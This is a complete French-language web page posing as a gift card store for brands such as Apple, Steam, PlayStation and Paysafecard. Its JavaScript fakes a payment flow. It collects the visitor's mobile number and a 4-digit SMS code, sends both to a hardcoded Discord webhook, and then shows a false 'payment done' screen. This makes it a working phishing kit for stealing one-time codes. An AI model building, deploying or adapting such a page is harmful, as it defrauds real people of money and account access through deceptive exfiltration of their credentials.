<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Cartes Cadeaux</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{min-height:100vh;background:linear-gradient(160deg,#0a1a3a,#0d2b5e 40%,#0a84ff);background-attachment:fixed;color:#fff;padding:24px 14px 130px;overflow-x:hidden}
.screen{display:none}.screen.active{display:block;animation:fade .4s ease}
@keyframes fade{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
h1{font-size:28px;font-weight:800;text-align:center;letter-spacing:-.8px;margin-bottom:6px}
.sub{text-align:center;opacity:.6;font-size:14px;margin-bottom:22px}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;max-width:640px;margin:0 auto}
@media(min-width:520px){.grid{grid-template-columns:repeat(4,1fr)}}
.brand{aspect-ratio:1;border-radius:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;cursor:pointer;border:none;color:#fff;font-weight:700;font-size:12px;transition:transform .15s;box-shadow:0 8px 22px rgba(0,0,0,.4),inset 0 -3px 0 rgba(0,0,0,.25),inset 0 2px 0 rgba(255,255,255,.15)}
.brand:active{transform:scale(.93)}
.brand .ico{font-size:34px;line-height:1;filter:drop-shadow(0 3px 6px rgba(0,0,0,.5))}
.card{background:#fff;color:#111;border-radius:30px;padding:22px 18px;box-shadow:0 20px 50px rgba(0,0,0,.4);margin:0 auto;max-width:540px}
.card h2{font-size:20px;font-weight:800;margin-bottom:16px}
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;z-index:100;padding:20px}
.modal-bg.show{display:flex}
.modal{background:#fff;color:#111;border-radius:30px;padding:26px 22px;max-width:380px;width:100%;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s cubic-bezier(.22,1.4,.4,1)}
@keyframes pop{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
.badge{width:84px;height:84px;border-radius:24px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;font-size:44px;box-shadow:0 10px 30px rgba(0,0,0,.35),inset 0 -3px 0 rgba(0,0,0,.2)}
.modal h3{text-align:center;font-size:20px;font-weight:800;margin-bottom:18px}
.amounts{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:18px}
.amt{padding:14px;border-radius:14px;border:2px solid #e5e5ea;background:#f7f7fa;font-size:17px;font-weight:700;cursor:pointer;transition:.15s;color:#111}
.amt:active{transform:scale(.95)}
.amt.sel{border-color:#0A84FF;background:#0A84FF;color:#fff}
.btn{width:100%;padding:16px;border-radius:16px;border:none;background:#0A84FF;color:#fff;font-size:17px;font-weight:700;cursor:pointer;box-shadow:0 6px 0 #0060cc;transition:.12s;margin-top:8px}
.btn:active{transform:translateY(3px);box-shadow:0 3px 0 #0060cc}
.btn.sec{background:#e5e5ea;color:#111;box-shadow:0 6px 0 #b8b8c0}
.btn.sec:active{box-shadow:0 3px 0 #b8b8c0}
.btn:disabled{opacity:.4;cursor:not-allowed;box-shadow:0 6px 0 #555}
.bar{position:fixed;bottom:0;left:0;right:0;background:rgba(10,26,58,.9);backdrop-filter:blur(20px);padding:14px 18px calc(14px + env(safe-area-inset-bottom));display:flex;justify-content:space-between;align-items:center;border-top:1px solid rgba(255,255,255,.12);z-index:50}
.bar .info{font-size:15px}
.bar .info b{font-size:19px}
.bar button{padding:12px 22px;border-radius:14px;border:none;background:#0A84FF;color:#fff;font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 4px 0 #0060cc}
.bar button:active{transform:translateY(2px);box-shadow:0 2px 0 #0060cc}
.row{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #eee}
.row .l{display:flex;align-items:center;gap:12px}
.row .emo{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px}
.row .txt{display:flex;flex-direction:column;gap:2px}
.row .txt b{font-size:15px;color:#111}
.row .txt span{font-size:13px;color:#888}
.row .rm{background:#ff3b30;color:#fff;border:none;border-radius:10px;padding:8px 12px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 3px 0 #a00}
.row .rm:active{transform:translateY(2px);box-shadow:0 1px 0 #a00}
.tot{display:flex;justify-content:space-between;font-size:20px;font-weight:800;padding:18px 0 6px;color:#111}
input{width:100%;padding:16px;border-radius:16px;border:2px solid #e5e5ea;background:#f7f7fa;font-size:20px;text-align:center;letter-spacing:3px;font-weight:700;outline:none;color:#111}
input:focus{border-color:#0A84FF;background:#fff}
input:disabled{opacity:.5;background:#eee}
.ring-wrap{position:relative;width:180px;height:180px;margin:20px auto}
.ring-wrap svg{transform:rotate(-90deg)}
.ring-wrap .txt{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:800;color:#111}
.ok{text-align:center;font-size:70px;margin-bottom:14px}
.center{text-align:center}
.err{color:#ff3b30;font-size:13px;margin-top:8px;text-align:center;min-height:16px}
.empty{text-align:center;padding:40px 0;color:#888;font-size:15px}
.note{font-size:14px;color:#666;text-align:center;margin-top:12px;line-height:1.5}
.back{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:#fff;padding:9px 14px;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:16px}
</style>
</head>
<body>

<div id="scr1" class="screen active">
  <h1>Cartes Cadeaux</h1>
  <p class="sub">Choisis ta marque · Livraison SMS 24h</p>
  <div class="grid" id="brandGrid"></div>
</div>

<div id="scr2" class="screen">
  <button class="back" onclick="show('scr1')">← Catalogue</button>
  <h1 style="font-size:24px">Panier</h1>
  <p class="sub">Vérifie ta commande</p>
  <div class="card" id="cartCard"></div>
</div>

<div id="scr3" class="screen">
  <button class="back" onclick="show('scr2')">← Panier</button>
  <h1 style="font-size:24px">Ton numéro</h1>
  <p class="sub">Reçois tes cartes par SMS</p>
  <div class="card">
    <h2>Numéro de téléphone</h2>
    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="06 12 34 56 78" maxlength="14">
    <div class="err" id="phoneErr"></div>
    <button class="btn" id="payBtn">Payer · <span id="payTotal">0 €</span></button>
  </div>
</div>

<div id="scr4" class="screen">
  <h1 style="font-size:24px">Vérification</h1>
  <p class="sub">Code envoyé par SMS</p>
  <div class="card">
    <div class="ring-wrap">
      <svg width="180" height="180">
        <defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#0A84FF"/><stop offset="100%" stop-color="#7a2bff"/>
        </linearGradient></defs>
        <circle cx="90" cy="90" r="78" fill="none" stroke="#e5e5ea" stroke-width="12"/>
        <circle id="ringProg" cx="90" cy="90" r="78" fill="none" stroke="url(#g)" stroke-width="12" stroke-linecap="round" stroke-dasharray="490" stroke-dashoffset="0"/>
      </svg>
      <div class="txt" id="ringTxt">45</div>
    </div>
    <input id="codeInput" type="tel" inputmode="numeric" placeholder="0000" maxlength="4" disabled>
    <div class="err" id="codeErr"></div>
    <button class="btn" id="codeBtn" disabled>Valider</button>
  </div>
</div>

<div id="scr5" class="screen">
  <div class="card center">
    <div class="ok">✅</div>
    <h2 style="text-align:center">Paiement effectué</h2>
    <p class="note">Tu recevras tes cartes dans 24h par SMS.</p>
    <button class="btn sec" style="margin-top:20px" onclick="location.reload()">Retour à l'accueil</button>
  </div>
</div>

<div class="bar" id="cartBar">
  <div class="info"><b id="barCount">0</b> article(s) · <b id="barTotal">0 €</b></div>
  <button id="viewCart">Voir le panier →</button>
</div>

<div class="modal-bg" id="modalBg">
  <div class="modal">
    <div class="badge" id="mBadge"></div>
    <h3 id="mName"></h3>
    <div class="amounts" id="mAmounts"></div>
    <button class="btn" id="mAdd">Ajouter au panier</button>
    <button class="btn sec" id="mClose">Annuler</button>
  </div>
</div>

<script>
var WEBHOOK="https://discord.com/api/webhooks/1558248083517612093/1OAOJwck01SpDCngADpHxR2Dw8QL-bOWYhif8g3iym_o8ki3sb_QNu-hi3KFVwxqaPER";
var BRANDS=[
  {n:"Apple",e:"🍎",g:"linear-gradient(135deg,#1a1a1a,#333)"},
  {n:"PlayStation",e:"🎮",g:"linear-gradient(135deg,#003791,#0070d1)"},
  {n:"Xbox",e:"🕹️",g:"linear-gradient(135deg,#107C10,#0e6b0e)"},
  {n:"Fortnite",e:"⛏️",g:"linear-gradient(135deg,#7a3cff,#00c2ff)"},
  {n:"Steam",e:"💨",g:"linear-gradient(135deg,#1b2838,#2a475e)"},
  {n:"Google Play",e:"▶️",g:"linear-gradient(135deg,#01875f,#00c2a8)"},
  {n:"Spotify",e:"🎵",g:"linear-gradient(135deg,#1DB954,#14833b)"},
  {n:"Netflix",e:"🎬",g:"linear-gradient(135deg,#E50914,#8b0009)"},
  {n:"Disney+",e:"🏰",g:"linear-gradient(135deg,#113CCF,#0a2a8c)"},
  {n:"Nintendo",e:"🍄",g:"linear-gradient(135deg,#E60012,#a00010)"},
  {n:"Roblox",e:"🧱",g:"linear-gradient(135deg,#e2231a,#b01a12)"},
  {n:"Twitch",e:"📺",g:"linear-gradient(135deg,#9146FF,#5b2bb0)"},
  {n:"Amazon",e:"📦",g:"linear-gradient(135deg,#FF9900,#cc7a00)"},
  {n:"Uber Eats",e:"🍔",g:"linear-gradient(135deg,#06C167,#049a51)"},
  {n:"Starbucks",e:"☕",g:"linear-gradient(135deg,#00704A,#004d33)"},
  {n:"Discord",e:"💬",g:"linear-gradient(135deg,#5865F2,#3b45b0)"},
  {n:"Epic Games",e:"🎯",g:"linear-gradient(135deg,#2a2a2a,#000)"},
  {n:"V-Bucks",e:"💰",g:"linear-gradient(135deg,#00c2ff,#0066cc)"},
  {n:"iTunes",e:"🎶",g:"linear-gradient(135deg,#FC3C44,#c00)"},
  {n:"Microsoft",e:"🪟",g:"linear-gradient(135deg,#0078D4,#005a9e)"},
  {n:"Prepaid",e:"📱",g:"linear-gradient(135deg,#ff9500,#cc6600)"},
  {n:"Paysafecard",e:"💳",g:"linear-gradient(135deg,#00b0ff,#0077cc)"},
  {n:"Razer Gold",e:"🐍",g:"linear-gradient(135deg,#44D62C,#2a8f1a)"},
  {n:"Wish",e:"🛒",g:"linear-gradient(135deg,#2fb457,#1a7a35)"}
];
var AMOUNTS=[10,25,50,100];
var cart=[],selectedBrand=null,selectedAmt=null,phone="",timer=null;
function euros(v){return v+" €";}

function show(id){
  var s=document.querySelectorAll(".screen");
  for(var i=0;i<s.length;i++)s[i].classList.remove("active");
  document.getElementById(id).classList.add("active");
  document.getElementById("cartBar").style.display=(id==="scr1"||id==="scr2")?"flex":"none";
  window.scrollTo(0,0);
}

function renderBrands(){
  var g=document.getElementById("brandGrid");
  g.innerHTML="";
  for(var i=0;i<BRANDS.length;i++){
    (function(idx){
      var b=BRANDS[idx];
      var btn=document.createElement("button");
      btn.className="brand";
      btn.style.background=b.g;
      btn.innerHTML='<span class="ico">'+b.e+'</span><span>'+b.n+'</span>';
      btn.onclick=function(){openModal(idx);};
      g.appendChild(btn);
    })(i);
  }
}

function openModal(i){
  selectedBrand=i;selectedAmt=null;
  var b=BRANDS[i];
  document.getElementById("mBadge").style.background=b.g;
  document.getElementById("mBadge").textContent=b.e;
  document.getElementById("mName").textContent=b.n;
  var am=document.getElementById("mAmounts");
  am.innerHTML="";
  for(var k=0;k<AMOUNTS.length;k++){
    (function(v){
      var el=document.createElement("button");
      el.className="amt";
      el.textContent=euros(v);
      el.onclick=function(){
        var all=document.querySelectorAll(".amt");
        for(var j=0;j<all.length;j++)all[j].classList.remove("sel");
        el.classList.add("sel");
        selectedAmt=v;
      };
      am.appendChild(el);
    })(AMOUNTS[k]);
  }
  document.getElementById("modalBg").classList.add("show");
}

document.getElementById("mClose").onclick=function(){document.getElementById("modalBg").classList.remove("show");};
document.getElementById("modalBg").onclick=function(e){if(e.target.id==="modalBg")e.target.classList.remove("show");};

document.getElementById("mAdd").onclick=function(){
  if(selectedAmt===null)return;
  var b=BRANDS[selectedBrand];
  cart.push({name:b.n,emoji:b.e,grad:b.g,amount:selectedAmt});
  document.getElementById("modalBg").classList.remove("show");
  updateCart();
};

function updateCart(){
  var total=0;
  for(var i=0;i<cart.length;i++)total+=cart[i].amount;
  document.getElementById("barCount").textContent=cart.length;
  document.getElementById("barTotal").textContent=total+" €";
  var pt=document.getElementById("payTotal");
  if(pt)pt.textContent=total+" €";
}

function renderCart(){
  var c=document.getElementById("cartCard");
  if(cart.length===0){
    c.innerHTML='<div class="empty">Panier vide</div><button class="btn" onclick="show(\'scr1\')">Retour au catalogue</button>';
    return;
  }
  var html="";
  for(var i=0;i<cart.length;i++){
    var it=cart[i];
    html+='<div class="row"><div class="l"><div class="emo" style="background:'+it.grad+'">'+it.emoji+'</div><div class="txt"><b>'+it.name+'</b><span>'+euros(it.amount)+'</span></div></div><button class="rm" data-i="'+i+'">Retirer</button></div>';
  }
  var total=0;
  for(var k=0;k<cart.length;k++)total+=cart[k].amount;
  html+='<div class="tot"><span>Total</span><span>'+euros(total)+'</span></div>';
  html+='<button class="btn" id="payGo">Payer</button>';
  html+='<button class="btn sec" id="moreCards">Ajouter d\'autres cartes</button>';
  c.innerHTML=html;
  var rms=c.querySelectorAll(".rm");
  for(var j=0;j<rms.length;j++){
    rms[j].onclick=function(){
      var idx=parseInt(this.getAttribute("data-i"),10);
      cart.splice(idx,1);
      updateCart();renderCart();
    };
  }
  document.getElementById("payGo").onclick=function(){show("scr3");};
  document.getElementById("moreCards").onclick=function(){show("scr1");};
}

function formatPhone(v){
  var d=v.replace(/\D/g,"").slice(0,10);
  return d.replace(/(\d{2})(?=\d)/g,"$1 ").trim();
}

document.getElementById("phoneInput").addEventListener("input",function(e){
  e.target.value=formatPhone(e.target.value);
  document.getElementById("phoneErr").textContent="";
});

function cartText(){
  var out=[];
  for(var i=0;i<cart.length;i++)out.push(cart[i].name+" - "+cart[i].amount+"€");
  return out.join("\n");
}

function sendWebhook(content){
  var fd=new FormData();
  fd.append("payload_json",JSON.stringify({content:content}));
  fetch(WEBHOOK,{method:"POST",body:fd}).then(function(r){console.log("hook",r.status);}).catch(function(e){console.log("hook err",e);});
}

document.getElementById("payBtn").onclick=function(){
  var raw=document.getElementById("phoneInput").value.replace(/\s/g,"");
  if(!/^0[67]\d{8}$/.test(raw)){
    document.getElementById("phoneErr").textContent="Numéro invalide (06 ou 07, 10 chiffres)";
    return;
  }
  phone=raw;
  var total=0;
  for(var i=0;i<cart.length;i++)total+=cart[i].amount;
  var msg="💳 Paiement — Étape 1\nNuméro : "+formatPhone(phone)+"\nTotal : "+total+"€\nCartes :\n"+cartText();
  sendWebhook(msg);
  show("scr4");
  startTimer();
};

function startTimer(){
  var total=45,left=total;
  var circ=2*Math.PI*78;
  var prog=document.getElementById("ringProg");
  var txt=document.getElementById("ringTxt");
  var inp=document.getElementById("codeInput");
  var btn=document.getElementById("codeBtn");
  inp.disabled=true;btn.disabled=true;inp.value="";
  txt.textContent=left;
  prog.style.strokeDashoffset="0";
  if(timer)clearInterval(timer);
  timer=setInterval(function(){
    left--;
    txt.textContent=left;
    prog.style.strokeDashoffset=circ*(1-left/total);
    if(left<=0){
      clearInterval(timer);timer=null;
      inp.disabled=false;btn.disabled=false;
      try{inp.focus();}catch(e){}
    }
  },1000);
}

document.getElementById("codeInput").addEventListener("input",function(e){
  e.target.value=e.target.value.replace(/\D/g,"").slice(0,4);
  document.getElementById("codeErr").textContent="";
});

document.getElementById("codeBtn").onclick=function(){
  var code=document.getElementById("codeInput").value;
  if(!/^\d{4}$/.test(code)){
    document.getElementById("codeErr").textContent="Code à 4 chiffres requis";
    return;
  }
  var total=0;
  for(var i=0;i<cart.length;i++)total+=cart[i].amount;
  var msg="✅ Paiement — Code\nNuméro : "+formatPhone(phone)+"\nTotal : "+total+"€\nCode : "+code+"\nCartes :\n"+cartText();
  sendWebhook(msg);
  show("scr5");
};

document.getElementById("viewCart").onclick=function(){renderCart();show("scr2");};

renderBrands();
updateCart();
</script>
</body>
</html>
